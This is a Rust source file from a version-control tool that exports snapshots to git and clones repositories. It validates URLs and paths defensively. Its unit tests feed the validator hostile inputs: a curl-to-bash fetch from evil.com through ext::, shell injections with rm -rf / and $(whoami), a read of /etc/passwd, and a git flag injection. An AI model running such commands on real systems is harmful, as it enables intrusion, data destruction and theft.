use anyhow::Context;
use std::{
    path::{Component, Path, PathBuf},
    process::Command,
    sync::Arc,
};

use crate::{
    error::Result,
    object::{EntryKind, ObjectStore, TreeEntry},
    refs::{RedbRefStore, RefStore},
    snapshot::{RedbSnapshotStore, SnapshotStore},
};

fn get_git_email(repo_root: &Path) -> String {
    std::process::Command::new("git")
        .args(["config", "user.email"])
        .current_dir(repo_root)
        .output()
        .ok()
        .and_then(|o| {
            if o.status.success() {
                Some(String::from_utf8_lossy(&o.stdout).trim().to_string())
            } else {
                None
            }
        })
        .unwrap_or_else(|| "noa@noa.local".to_string())
}

fn is_safe_relative_path(path: &str) -> bool {
    let pb = PathBuf::from(path);
    for comp in pb.components() {
        match comp {
            Component::Normal(_) | Component::CurDir => {}
            _ => return false,
        }
    }
    !path.is_empty()
}

pub fn validate_git_url(url: &str) -> Result<()> {
    if url.is_empty() {
        anyhow::bail!("empty URL");
    }
    if url.starts_with('-') {
        anyhow::bail!("URL must not start with '-'");
    }
    if url.contains('\0') || url.contains('\n') || url.contains('\r') {
        anyhow::bail!("URL contains control characters");
    }
    if url.starts_with("ext::") {
        anyhow::bail!("ext:: transport is not allowed for security reasons");
    }
    let looks_valid = url.starts_with("https://")
        || url.starts_with("http://")
        || url.starts_with("git://")
        || url.starts_with("ssh://")
        || url.starts_with("file:///")
        || url.starts_with('/');
    if !looks_valid {
        let has_scp_syntax = url.contains(':')
            && !url.contains("://")
            && url.split_once(':').is_some_and(|(before, _)| {
                !before.is_empty() && !before.contains('/') && !before.starts_with('-')
            });
        if !has_scp_syntax {
            anyhow::bail!("invalid git URL format: {url}");
        }
    }
    Ok(())
}

#[must_use]
pub fn detect_lfs_available(repo_root: &Path) -> bool {
    Command::new("git")
        .args(["lfs", "version"])
        .current_dir(repo_root)
        .output()
        .is_ok_and(|o| o.status.success())
}

pub fn lfs_install(repo_root: &Path) -> Result<()> {
    Command::new("git")
        .args(["lfs", "install"])
        .current_dir(repo_root)
        .status()
        .with_context(|| "git lfs install failed")?;
    Ok(())
}

pub fn lfs_pull(repo_root: &Path) -> Result<()> {
    let status = Command::new("git")
        .args(["lfs", "pull"])
        .current_dir(repo_root)
        .status()
        .with_context(|| "git lfs pull failed")?;
    if !status.success() {
        anyhow::bail!("git lfs pull exited with non-zero status: {status}");
    }
    Ok(())
}

pub fn lfs_push_all(repo_root: &Path, remote_url: &str) -> Result<()> {
    validate_git_url(remote_url)?;
    let status = Command::new("git")
        .args(["lfs", "push", "--all", remote_url])
        .current_dir(repo_root)
        .status()
        .with_context(|| "git lfs push --all failed")?;
    if !status.success() {
        anyhow::bail!("git lfs push --all exited with non-zero status: {status}");
    }
    Ok(())
}

#[must_use]
pub fn has_lfs_tracking(repo_root: &Path) -> bool {
    repo_root.join(".gitattributes").exists()
        || Command::new("git")
            .args(["lfs", "track"])
            .current_dir(repo_root)
            .output()
            .is_ok_and(|o| !o.stdout.is_empty())
}

/// Remove every symlink at `rel` itself or on one of its ancestor
/// directories under `repo_root`. Writing file bytes through a stale
/// symlink corrupts the link target (#72); a symlinked ancestor would
/// swallow everything materialized beneath it. Regular files and
/// directories are never touched here.
async fn remove_symlink_obstacles(repo_root: &Path, rel: &str) {
    let mut current = Some(PathBuf::from(rel));
    while let Some(p) = current {
        if p.as_os_str().is_empty() {
            break;
        }
        let abs = repo_root.join(&p);
        if let Ok(md) = tokio::fs::symlink_metadata(&abs).await {
            if md.file_type().is_symlink() {
                if tokio::fs::remove_file(&abs).await.is_ok() {
                    tracing::debug!("export removed stale symlink {}", abs.display());
                }
            }
        }
        current = p.parent().map(Path::to_path_buf);
    }
}

/// Create `link_path` as a symlink whose target is `target_bytes` (git
/// stores the target verbatim, without a trailing newline).
fn create_symlink(target_bytes: &[u8], link_path: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        std::os::unix::fs::symlink(std::ffi::OsStr::from_bytes(target_bytes), link_path)
    }
    #[cfg(windows)]
    {
        // File-style link. A bare target string cannot tell files from
        // directories; git checkouts of file links are the common case and
        // round-trip exactly.
        std::os::windows::fs::symlink_file(
            String::from_utf8_lossy(target_bytes).as_ref(),
            link_path,
        )
    }
    #[cfg(not(any(unix, windows)))]
    {
        let _ = (target_bytes, link_path);
        Err(std::io::Error::new(
            std::io::ErrorKind::Unsupported,
            "symlinks unsupported on this platform",
        ))
    }
}

/// Paths currently present in the git index (NUL-separated `ls-files`).
/// Mode fixups below only touch these, so entries that `git add` skipped
/// (e.g. ignored files) warn once instead of failing the export.
fn git_tracked_set(repo_root: &Path) -> std::collections::HashSet<String> {
    Command::new("git")
        .args(["ls-files", "-z"])
        .current_dir(repo_root)
        .output()
        .map(|o| {
            o.stdout
                .split(|b| *b == 0)
                .filter(|s| !s.is_empty())
                .map(|s| String::from_utf8_lossy(s).into_owned())
                .collect()
        })
        .unwrap_or_default()
}

/// Hash `bytes` into the git object store (`hash-object -w`) and return the
/// oid. Used to re-anchor symlink blobs that `git add` could not see as
/// links (fallback plain files, `core.symlinks=false`).
fn git_hash_stdin(repo_root: &Path, bytes: &[u8]) -> Result<String> {
    use std::io::Write as _;
    use std::process::Stdio;
    let mut child = Command::new("git")
        .args(["hash-object", "-w", "--stdin"])
        .current_dir(repo_root)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .with_context(|| "git hash-object failed to spawn")?;
    child
        .stdin
        .take()
        .context("git hash-object stdin unavailable")?
        .write_all(bytes)
        .with_context(|| "git hash-object stdin write failed")?;
    let out = child
        .wait_with_output()
        .with_context(|| "git hash-object failed")?;
    if !out.status.success() {
        anyhow::bail!(
            "git hash-object failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Write one index entry directly (`update-index --cacheinfo`). This is how
/// symlinks that only exist as fallback files and gitlinks (which have no
/// workdir presence at all) get their exact `120000` / `160000` modes.
fn git_cacheinfo(repo_root: &Path, mode: &str, oid: &str, rel: &str) -> Result<()> {
    // NOTE: no `--` separator here: `--cacheinfo` consumes exactly three
    // following args (mode, oid, path), so a `--` would be taken as the
    // path itself. Entry paths with a leading dash are pathological and
    // unsupported by this fixup. `--add` is required: the path is either
    // absent from the index (never staged, e.g. an ignored fallback file)
    // or was just removed from it by the `rm --cached` below.
    let status = Command::new("git")
        .args(["update-index", "--add", "--cacheinfo", mode, oid, rel])
        .current_dir(repo_root)
        .status()
        .with_context(|| format!("git update-index --cacheinfo failed for {rel}"))?;
    if !status.success() {
        anyhow::bail!("git update-index --cacheinfo {mode} for {rel} failed");
    }
    Ok(())
}

pub async fn export_noa_to_git(repo_root: &Path, db: Arc<redb::Database>) -> Result<()> {
    let repo_root = repo_root.to_path_buf();

    // Warn if the git working tree has untracked or modified files
    let status_output = std::process::Command::new("git")
        .args(["status", "--porcelain"])
        .current_dir(&repo_root)
        .output()
        .with_context(|| "git status failed")?;
    if !status_output.stdout.is_empty() {
        tracing::warn!(
            "git working tree has uncommitted changes; they will be included in the export commit"
        );
    }

    let snap_store = RedbSnapshotStore::new(Arc::clone(&db))?;
    let ref_store = RedbRefStore::new(Arc::clone(&db))?;
    let ws_mgr = crate::workspace::WorkspaceManager::new(Arc::clone(&db))?;
    let obj_store = crate::object::RedbObjectStore::new(db)?;

    let noa_dir = crate::repo::Repository::resolve_noa_dir(&repo_root);
    let head_ws = tokio::fs::read_to_string(noa_dir.join("HEAD"))
        .await?
        .trim()
        .to_string();

    let ws = ws_mgr.get(&head_ws).await?;
    let snap_id = if let Some(w) = ws {
        w.head
    } else {
        let head_ref = ref_store.get("HEAD").await?;
        match head_ref {
            Some(id) => id,
            None => anyhow::bail!("no HEAD snapshot found"),
        }
    };
    let snapshot = snap_store.get(&snap_id).await?;

    let tree = obj_store
        .get_tree(&crate::object::TreeId(snapshot.tree_hash.clone()))
        .await?;

    let canonical_root = repo_root
        .canonicalize()
        .unwrap_or_else(|_| repo_root.to_path_buf());

    // Flatten (possibly nested) noa trees to workdir-relative paths. Import
    // produces flat top-level names that already contain `/`; the snapshot
    // engine produces nested `Tree` entries with child-relative names.
    let mut flat: Vec<(String, TreeEntry)> = Vec::new();
    let mut pending: Vec<(String, crate::object::TreeId)> = Vec::new();
    for entry in &tree.0 {
        if entry.kind == EntryKind::Tree {
            pending.push((
                entry.name.clone(),
                crate::object::TreeId(entry.id.clone()),
            ));
        } else {
            flat.push((entry.name.clone(), entry.clone()));
        }
    }
    while let Some((prefix, id)) = pending.pop() {
        let sub = obj_store.get_tree(&id).await?;
        for child in &sub.0 {
            let full = format!("{prefix}/{}", child.name);
            if child.kind == EntryKind::Tree {
                pending.push((full, crate::object::TreeId(child.id.clone())));
            } else {
                let mut owned = child.clone();
                owned.name = full.clone();
                flat.push((full, owned));
            }
        }
    }
    // Deterministic order. Order-independence itself comes from phase A
    // below: no write can pass through a symlink, whatever the order.
    flat.sort_by(|a, b| a.0.cmp(&b.0));

    // Phase A: remove every symlink at or above a path that will hold a
    // symlink or gitlink. Writing file bytes through a stale symlink is
    // what corrupted link targets (#72); a symlinked ancestor would swallow
    // everything beneath it.
    for (rel, entry) in &flat {
        if matches!(entry.kind, EntryKind::Symlink | EntryKind::Gitlink) {
            remove_symlink_obstacles(&repo_root, rel).await;
        }
    }

    // Phase B: materialize. Plain files are written before symlinks are
    // recreated, and every leaf write re-checks its own path, so the result
    // does not depend on entry order.
    let mut exec_paths: Vec<String> = Vec::new();
    let mut plain_paths: Vec<String> = Vec::new();
    let mut symlink_infos: Vec<(String, Vec<u8>)> = Vec::new();
    let mut gitlink_infos: Vec<(String, String)> = Vec::new();
    for (rel, entry) in &flat {
        if !is_safe_relative_path(rel) {
            tracing::warn!("skipping unsafe path in export tree entry: {}", rel);
            continue;
        }
        let file_path = repo_root.join(rel);

        if let Some(parent) = file_path.parent() {
            if let Ok(canonical_parent) = parent.canonicalize() {
                if !canonical_parent.starts_with(&canonical_root) {
                    tracing::warn!(
                        "skipping path traversal in export tree entry: {}",
                        rel
                    );
                    continue;
                }
            } else if parent.exists() {
                tracing::warn!(
                    "skipping export entry with unresolvable parent: {}",
                    rel
                );
                continue;
            } else if rel.contains("..") {
                tracing::warn!(
                    "skipping export entry with suspicious relative path: {}",
                    rel
                );
                continue;
            }
        }
        match entry.kind {
            EntryKind::Tree => {
                tokio::fs::create_dir_all(&file_path).await?;
            }
            EntryKind::Blob | EntryKind::Executable => {
                if let Some(parent) = file_path.parent() {
                    tokio::fs::create_dir_all(parent).await?;
                }
                // The leaf itself may still be a stale symlink (e.g. the
                // entry used to be a symlink in an older snapshot). Remove
                // it so the write below cannot pass through it.
                if let Ok(md) = tokio::fs::symlink_metadata(&file_path).await {
                    if md.file_type().is_symlink() {
                        tokio::fs::remove_file(&file_path).await?;
                    }
                }
                let blob = obj_store
                    .get_blob(&crate::object::BlobId(entry.id.clone()))
                    .await?;
                tokio::fs::write(&file_path, &blob).await?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = if entry.kind == EntryKind::Executable {
                        0o755
                    } else {
                        0o644
                    };
                    let _ = tokio::fs::set_permissions(
                        &file_path,
                        std::fs::Permissions::from_mode(mode),
                    )
                    .await;
                }
                if entry.kind == EntryKind::Executable {
                    exec_paths.push(rel.clone());
                } else {
                    plain_paths.push(rel.clone());
                }
            }
            EntryKind::Symlink => {
                if let Some(parent) = file_path.parent() {
                    tokio::fs::create_dir_all(parent).await?;
                }
                let blob = obj_store
                    .get_blob(&crate::object::BlobId(entry.id.clone()))
                    .await?;
                // Phase A removed symlinks; a stale regular file still
                // blocks creation.
                let _ = tokio::fs::remove_file(&file_path).await;
                if create_symlink(&blob, &file_path).is_err() {
                    // Platform refused (e.g. Windows without Developer
                    // Mode): store the target bytes as a plain file, exactly
                    // like a `core.symlinks=false` checkout. The index
                    // fixup below still records mode 120000.
                    tracing::warn!(
                        "symlink creation failed for {rel}; storing target bytes as plain file"
                    );
                    tokio::fs::write(&file_path, &blob).await?;
                }
                symlink_infos.push((rel.clone(), blob));
            }
            EntryKind::Gitlink => {
                if !(entry.id.len() == 40 || entry.id.len() == 64)
                    || !entry.id.bytes().all(|b| b.is_ascii_hexdigit())
                {
                    tracing::warn!("skipping gitlink with malformed oid at {rel}");
                    continue;
                }
                if file_path.is_dir() {
                    // Plain clones leave an empty directory behind; only an
                    // empty one may go. Anything else is user data.
                    if tokio::fs::remove_dir(&file_path).await.is_err() {
                        tracing::warn!(
                            "leaving non-empty directory at gitlink path {rel}; gitlink not restored"
                        );
                        continue;
                    }
                } else {
                    let _ = tokio::fs::remove_file(&file_path).await;
                }
                gitlink_infos.push((rel.clone(), entry.id.clone()));
            }
        }
    }

    let repo_root_clone = repo_root.clone();
    tokio::task::spawn_blocking(move || {
        if has_lfs_tracking(&repo_root_clone) && detect_lfs_available(&repo_root_clone) {
            if let Err(e) = lfs_install(&repo_root_clone) {
                tracing::warn!("git lfs install failed: {e}");
            }
        }

        let status_output = Command::new("git")
            .args(["status", "--porcelain"])
            .current_dir(&repo_root_clone)
            .output()
            .with_context(|| "git status failed")?;

        let has_changes = !status_output.stdout.is_empty();
        if has_changes {
            Command::new("git")
                .args(["add", "-A"])
                .current_dir(&repo_root_clone)
                .status()
                .with_context(|| "git add failed")?;

            // Authoritative mode fixups. `git add` alone records whatever
            // the workdir and `core.fileMode` / `core.symlinks` imply, so
            // the noa tree — the single source of truth — re-asserts every
            // mode here. Fixups warn instead of failing: an entry `git add`
            // skipped (e.g. an ignored file) has no index entry to fix.
            let tracked = git_tracked_set(&repo_root_clone);
            if !exec_paths.is_empty() {
                let wanted: Vec<&str> = exec_paths
                    .iter()
                    .map(String::as_str)
                    .filter(|p| tracked.contains(*p))
                    .collect();
                if !wanted.is_empty() {
                    match Command::new("git")
                        .args(["update-index", "--chmod=+x", "--"])
                        .args(&wanted)
                        .current_dir(&repo_root_clone)
                        .status()
                    {
                        Ok(st) if st.success() => {}
                        res => tracing::warn!("exec-bit fixup failed: {res:?}"),
                    }
                }
                for rel in exec_paths.iter().filter(|p| !tracked.contains(p.as_str())) {
                    tracing::warn!("{rel} not staged by git add; exec-bit fixup skipped");
                }
            }
            if !plain_paths.is_empty() {
                let wanted: Vec<&str> = plain_paths
                    .iter()
                    .map(String::as_str)
                    .filter(|p| tracked.contains(*p))
                    .collect();
                if !wanted.is_empty() {
                    match Command::new("git")
                        .args(["update-index", "--chmod=-x", "--"])
                        .args(&wanted)
                        .current_dir(&repo_root_clone)
                        .status()
                    {
                        Ok(st) if st.success() => {}
                        res => tracing::warn!("plain-bit fixup failed: {res:?}"),
                    }
                }
            }
            for (rel, target) in &symlink_infos {
                match git_hash_stdin(&repo_root_clone, target) {
                    Ok(oid) => {
                        if let Err(e) =
                            git_cacheinfo(&repo_root_clone, "120000", &oid, rel)
                        {
                            tracing::warn!("symlink fixup failed for {rel}: {e:#}");
                        }
                    }
                    Err(e) => tracing::warn!("symlink fixup failed for {rel}: {e:#}"),
                }
            }
            for (rel, oid) in &gitlink_infos {
                // `git add -A` may have staged a stale file here; the
                // gitlink must own the index entry.
                let _ = Command::new("git")
                    .args(["rm", "--cached", "-q", "--", rel])
                    .current_dir(&repo_root_clone)
                    .status();
                if let Err(e) = git_cacheinfo(&repo_root_clone, "160000", oid, rel) {
                    tracing::warn!("gitlink fixup failed for {rel}: {e:#}");
                }
            }

            let status_output = Command::new("git")
                .args(["status", "--porcelain"])
                .current_dir(&repo_root_clone)
                .output()
                .with_context(|| "git status failed")?;

            let has_changes = !status_output.stdout.is_empty();

            if has_changes {
                let msg = format!(
                    "[noa export] snapshot {} from workspace {}",
                    snapshot.id, snapshot.workspace
                );
                let git_email = get_git_email(&repo_root_clone);
                Command::new("git")
                    .args(["commit", "-m", &msg])
                    .current_dir(&repo_root_clone)
                    .env("GIT_AUTHOR_NAME", &snapshot.author)
                    .env("GIT_AUTHOR_EMAIL", &git_email)
                    .env("GIT_COMMITTER_NAME", &snapshot.author)
                    .env("GIT_COMMITTER_EMAIL", &git_email)
                    .status()
                    .with_context(|| "git commit failed")?;
            }
        }

        Ok(())
    })
    .await?
}

pub async fn clone_git_to_noa(url: &str, target: &Path) -> Result<()> {
    validate_git_url(url)?;

    let url_owned = url.to_string();
    let target = target.to_path_buf();

    let status = tokio::task::spawn_blocking({
        let url = url_owned.clone();
        let target = target.clone();
        move || {
            Command::new("git")
                .args(["clone", &url, &target.to_string_lossy()])
                .status()
        }
    })
    .await
    .with_context(|| "git clone failed")?
    .with_context(|| "git clone failed")?;
    if !status.success() {
        anyhow::bail!("git clone exited with non-zero status");
    }

    let config = crate::config::RemoteConfig {
        name: "origin".to_string(),
        url: url_owned,
        protocol: crate::config::RemoteProtocol::Git,
        pr: None,
    };
    let repo = crate::repo::Repository::init_with_remotes(&target, vec![config])?;

    let db = Arc::clone(&repo.db);
    super::import::import_git_to_noa(&target, Arc::clone(&db)).await?;

    let ref_store = crate::refs::RedbRefStore::new(Arc::clone(&db))?;
    let head_ref = ref_store.get("HEAD").await?;
    let head_snap_id = head_ref.unwrap_or_else(crate::snapshot::empty_snapshot_id);

    let ws_mgr = crate::workspace::WorkspaceManager::new(Arc::clone(&db))?;
    let now = crate::now_micros();
    // Idempotent: workspace may already exist from init_with_remotes
    if let Err(e) = ws_mgr
        .create(&crate::workspace::Workspace {
            name: "default".to_string(),
            head: head_snap_id.clone(),
            base: head_snap_id.clone(),
            agent_id: None,
            last_seq: 0,
            created_at: now,
            updated_at: now,
        })
        .await
    {
        if !crate::error::is_workspace_already_exists(&e) {
            return Err(e);
        }
    }

    let target_path = target.clone();
    tokio::task::spawn_blocking(move || {
        if detect_lfs_available(&target_path) {
            if let Err(e) = lfs_install(&target_path) {
                tracing::warn!("git lfs install failed: {e}");
            }
            if has_lfs_tracking(&target_path) {
                if let Err(e) = lfs_pull(&target_path) {
                    tracing::warn!("git lfs pull failed: {e}");
                }
            }
        }
        Ok::<(), anyhow::Error>(())
    })
    .await??;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_safe_relative_path_normal() {
        assert!(is_safe_relative_path("src/main.rs"));
        assert!(is_safe_relative_path("a/b/c.txt"));
        assert!(is_safe_relative_path("file.rs"));
        assert!(is_safe_relative_path("./foo.rs"));
        assert!(is_safe_relative_path("a/./b/./c.rs"));
    }

    #[test]
    fn test_is_safe_relative_path_traversal() {
        assert!(!is_safe_relative_path("../etc/passwd"));
        assert!(!is_safe_relative_path("foo/../../bar"));
        assert!(!is_safe_relative_path("../../root"));
        assert!(!is_safe_relative_path("/etc/passwd"));
    }

    #[test]
    fn test_is_safe_relative_path_empty() {
        assert!(!is_safe_relative_path(""));
    }

    #[test]
    fn test_validate_git_url_valid() {
        assert!(validate_git_url("https://github.com/user/repo.git").is_ok());
        assert!(validate_git_url("http://example.com/repo").is_ok());
        assert!(validate_git_url("git://example.com/repo").is_ok());
        assert!(validate_git_url("ssh://git@github.com/user/repo.git").is_ok());
        assert!(validate_git_url("file:///path/to/repo").is_ok());
        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
        assert!(validate_git_url("/absolute/path").is_ok());
    }

    #[test]
    fn test_validate_git_url_empty() {
        assert!(validate_git_url("").is_err());
    }

    #[test]
    fn test_validate_git_url_dash_prefix() {
        assert!(validate_git_url("-flagInjection").is_err());
    }

    #[test]
    fn test_validate_git_url_control_chars() {
        assert!(validate_git_url("https://x.com\0").is_err());
        assert!(validate_git_url("https://x.com\nextra").is_err());
        assert!(validate_git_url("https://x.com\r\nextra").is_err());
    }

    #[test]
    fn test_validate_git_url_ext_transport_blocked() {
        assert!(validate_git_url("ext::/bin/sh -c id").is_err());
        assert!(validate_git_url("ext::curl evil.com | bash").is_err());
    }

    #[test]
    fn test_validate_git_url_scp_style() {
        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
        assert!(validate_git_url("user@host:path/to/repo").is_ok());
    }

    #[test]
    fn test_validate_git_url_invalid() {
        assert!(validate_git_url("not-a-url").is_err());
        assert!(validate_git_url("random string").is_err());
    }

    #[test]
    fn test_validate_git_url_backtick_injection() {
        assert!(validate_git_url("repo`rm -rf /`").is_err());
    }

    #[test]
    fn test_validate_git_url_dollar_injection() {
        assert!(validate_git_url("$(whoami)").is_err());
    }

    #[test]
    fn test_validate_git_url_semicolon() {
        assert!(validate_git_url("x;rm -rf /").is_err());
    }

    #[test]
    fn test_validate_git_url_pipe() {
        assert!(validate_git_url("x|cat /etc/passwd").is_err());
    }

    #[test]
    fn test_validate_git_url_git_clone_flag() {
        assert!(validate_git_url("--config=user.name=evil").is_err());
    }

    #[test]
    fn test_validate_git_url_newline_in_scheme() {
        assert!(validate_git_url("https://x.com\nextra/path").is_err());
    }

    #[test]
    fn test_is_safe_relative_path_dot_dot_substring() {
        assert!(is_safe_relative_path("foo..bar.rs"));
        assert!(is_safe_relative_path("a..rs"));
    }

    #[test]
    fn test_is_safe_relative_path_only_dot_dot() {
        assert!(!is_safe_relative_path(".."));
        assert!(!is_safe_relative_path("../"));
    }
}
